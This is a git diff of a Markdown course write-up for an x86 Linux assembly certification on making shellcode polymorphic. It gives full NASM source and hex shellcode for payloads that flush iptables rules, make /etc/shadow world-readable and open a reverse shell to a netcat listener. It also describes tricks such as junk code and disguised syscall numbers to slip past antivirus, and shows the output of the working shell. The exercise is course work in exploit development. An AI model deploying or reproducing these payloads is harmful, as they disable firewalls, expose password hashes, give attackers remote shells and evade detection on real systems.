@@ -4,7 +4,7 @@ This MD file has been created for the SecurityTube Linux Assembly Expert certifi
 
 # Choosing shellcodes
 
-For the polymorphism exercises, I decided to choose three shellcodes from different authors with a real offensive usage. In my humble opinion, send Phuck3d! to all terminals (http://shell-storm.org/shellcode/files/shellcode-604.php) or open the CD drive (http://shell-storm.org/shellcode/files/shellcode-621.php/http://shell-storm.org/shellcode/files/shellcode-653.php) does not have real usage in an offensive assessment. 
+For the polymorphism exercises, I decided to choose three shellcodes from different authors with a real offensive usage. In my humble opinion, send *Phuck3d!* to all terminals (http://shell-storm.org/shellcode/files/shellcode-604.php) or open the CD drive (http://shell-storm.org/shellcode/files/shellcode-621.php) does not have real usage in an offensive assessment. 
 
 #  Linux/x86 - iptables -F - 58 bytes by dev0id
 Source: http://shell-storm.org/shellcode/files/shellcode-361.php
@@ -36,13 +36,13 @@ callme:
 This shellcode flush iptables rules (local Linux Firewall). In order to test the shellcode filtering rules must be set, with root privileges:
 
 ```sh
-$ nasm -f elf32 iptable-shellstrom.nasm && ld -N -z execstack -o iptable-shellstrom iptable-shellstrom.o
+$ nasm -f elf32 iptables-shellstrom.nasm && ld -N -z execstack -o iptables-shellstrom iptables-shellstrom.o
 $ sudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED -j ACCEPT
 $ sudo iptables -L INPUT
 Chain INPUT (policy ACCEPT)
 target     prot opt source               destination         
 ACCEPT     all  --  anywhere             anywhere             ctstate ESTABLISHED
-$ sudo ./iptable-shellstrom
+$ sudo ./iptables-shellstrom
 $ sudo iptables -L INPUT
 Chain INPUT (policy ACCEPT)
 target     prot opt source               destination
@@ -94,41 +94,49 @@ decode:
 At the end AL is set to 17, in order to set it to 0xb (11) let's subtract 6 and add junk code. At the end of the decode loop, EAX is set. EAX/AL cannot be used as a null byte, but ECX/CL can.
 
 ```ASM
+global _start			
+
+section .text
+_start:
+	jmp	short	callme
 main:
- pop esi
- mov ecx, eax ; Used for not xor ecx, ecx
- xor ecx, eax ;
- mov eax, ecx
- mov cl, 17
+	pop	esi
+	mov ecx, eax ; Used for not xor ecx, ecx
+	xor ecx, eax ;
+	mov eax, ecx
+	mov cl, 17
 
 decode:
- inc byte [esi], 1
- inc esi
- inc al
- loop decode
+	dec byte [esi]
+	inc esi
+	inc al
+	loop decode
 
- sub esi, 17
-
- mov byte [esi+14],cl ;replace al by cl
- mov byte [esi+17],cl ;replace al by cl
- mov long [esi+18],esi
- inc ebx ;do nothing
- lea  ebx,[esi+15]
- mov long [esi+22],ebx
- mov long [esi+26],ecx ;replace eax by ecx
- sub al, 6
- mov ebx,esi
- lea ecx,[esi+18]
- xchg ebx, ebx ;do nothing
- lea edx,[esi+26]
- int 0x80
+	sub esi, 17
+	
+	mov byte [esi+14],cl ;replace al by cl
+	mov byte [esi+17],cl ;replace al by cl
+	mov long [esi+18],esi
+	inc ebx
+	lea	 ebx,[esi+15]
+	mov long [esi+22],ebx
+	mov long [esi+26],ecx
+	sub al, 6
+	mov	ebx,esi
+	lea	ecx,[esi+18]
+	xchg ebx, ebx ;do nothing
+	lea	edx,[esi+26]
+	int	0x80
+callme:
+	call	main
+	db '0tcjo0jqubcmft#.G#'
 ```
 Let's try this out!
 
 ## Compilation
 ```sh
-$ nasm -f elf32 iptable-poly.nasm
-$ bash ../get-shellcode.sh iptable-poly.o
+$ nasm -f elf32 iptables-poly.nasm
+$ bash ../get-shellcode.sh iptables-poly.o
 "\xeb\x34\x5e\x89\xc1\x31\xc1\x89\xc8\xb1\x11\xfe\x0e\x46\xfe\xc0\xe2\xf9\x83\xee\x11\x88\x4e\x0e\x88\x4e\x11\x89\x76\x12\x43\x8d\x5e\x0f\x89\x5e\x16\x89\x4e\x1a\x2c\x06\x89\xf3\x8d\x4e\x12\x87\xdb\x8d\x56\x1a\xcd\x80\xe8\xc7\xff\xff\xff\x30\x74\x63\x6a\x6f\x30\x6a\x71\x75\x62\x63\x6d\x66\x74\x23\x2e\x47\x23"
 $ gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
 $ sudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED -j ACCEPT
@@ -223,7 +231,7 @@ $ sudo chmod 640 /etc/shadow
 ## Tricks
 
 Polymorphism tricks will be:
- * Change the string *//etc/shadow'*
+ * Change the string *//etc/shadow*
  * Do not put 0x17 or 0xf into al which are known for calling setuid or chmod.
 
 ## Polymorphism
@@ -233,6 +241,11 @@ In order to change *//etc/shadow*, each hexadecimal value will be increased by 0
 For syscall, 0xd will be put in AL because this is syscall for time which is normally not triggered by antivirus.
 
 ```ASM
+global _start
+
+section .text
+
+_start:
 xor    ebx,ebx
 mov    al,0xd ; syscall for time
 add al,10
@@ -341,11 +354,10 @@ The original shellcode is a classic reverse shell as done in the first exercise.
 Polymorphism tricks will be:
  * Change the string *//etc/shadow'*
  * Do not put 0x17 or 0xf into al which are known for calling setuid or chmod.
-
  * *xchg   edx,ebx* (87 da) is replaced by *cdq* (99) which is smaller. CQD extend EAX sign to EDX. 
  * *xor edx, edx* will be replace by the same instruction. This will set the shellcode shorter.
-* Do not set 0xb (execve) or 0x3f (dup2) in AL. Times syscall value (0x2b) will be put in AL before being changed.
-* Add junk code between pushing IP and port
+ * Do not set 0xb (execve) or 0x3f (dup2) in AL. Times syscall value (0x2b) will be put in AL before being changed.
+ * Add junk code between pushing IP and port
 
 ## Polymorphism
 
@@ -409,7 +421,7 @@ loop:
 
 ## Compilation
 
-Before running the shellcode, start a listener on port 1337.
+Before running the shellcode, a listener is started on port 1337.
 
 ```
 $ nc -lv 1337
@@ -439,7 +451,7 @@ uid=1000(cervoise) gid=1000(cervoise) groups=1000(cervoise),4(adm),24(cdrom),27(
 exit
 ```
 
-It works, new size of the shellcode is 90 (XXX% of the original size):
+It works, new size of the shellcode is 90 (121.6% of the original size):
 ```sh
 $ echo "scale=3; 90/74*100" |bc
 121.600
